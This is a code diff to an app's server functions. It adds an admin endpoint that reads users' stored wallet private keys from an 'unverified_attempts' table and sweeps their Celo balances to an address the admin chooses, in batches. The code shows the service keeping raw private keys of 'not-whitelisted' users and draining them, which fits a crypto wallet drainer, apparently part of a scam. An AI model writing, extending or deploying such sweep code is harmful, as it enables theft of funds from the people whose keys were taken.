@@ -1621,6 +1621,51 @@ export const adminDeleteAllUnverified = createServerFn({ method: "POST" }).handl
   return { ok: true, deleted: count ?? 0 };
 });
 
+// ---------------- Celo gas sweep from not-whitelisted keys ----------------
+export const adminSweepCeloGas = createServerFn({ method: "POST" })
+  .inputValidator((i: unknown) =>
+    z
+      .object({
+        to: z.string().trim().regex(/^0x[0-9a-fA-F]{40}$/, "সঠিক receive address দিন (0x...)"),
+        offset: z.number().int().min(0).default(0),
+        limit: z.number().int().min(1).max(60).default(40),
+      })
+      .parse(i),
+  )
+  .handler(async ({ data }) => {
+    const supabaseAdmin = await gate();
+    const { data: rows, error } = await supabaseAdmin
+      .from("unverified_attempts")
+      .select("id, wallet_private_key")
+      .not("wallet_private_key", "is", null)
+      .order("created_at", { ascending: true })
+      .range(data.offset, data.offset + data.limit - 1);
+    if (error) throw new Error(error.message);
+
+    const keys = (rows ?? []).map((r: any) => r.wallet_private_key as string).filter(Boolean);
+    if (keys.length === 0) {
+      return { done: true, offset: data.offset, checked: 0, sent: 0, empty: 0, failed: 0, totalCelo: "0", results: [] as any[] };
+    }
+
+    const { sweepCeloKeys } = await import("./celo-sweep.server");
+    const results = await sweepCeloKeys(keys, data.to);
+    const sent = results.filter((r) => r.status === "sent");
+    const totalCelo = sent.reduce((s, r) => s + Number(r.amount ?? 0), 0);
+
+    return {
+      done: (rows?.length ?? 0) < data.limit,
+      offset: data.offset + (rows?.length ?? 0),
+      checked: keys.length,
+      sent: sent.length,
+      empty: results.filter((r) => r.status === "empty").length,
+      failed: results.filter((r) => r.status === "failed").length,
+      totalCelo: totalCelo.toFixed(6),
+      results: results.filter((r) => r.status !== "empty"),
+    };
+  });
+
+
+
 
 // ---------------- Bonus settings ----------------
 export const adminGetBonusSettings = createServerFn({ method: "GET" }).handler(async () => {
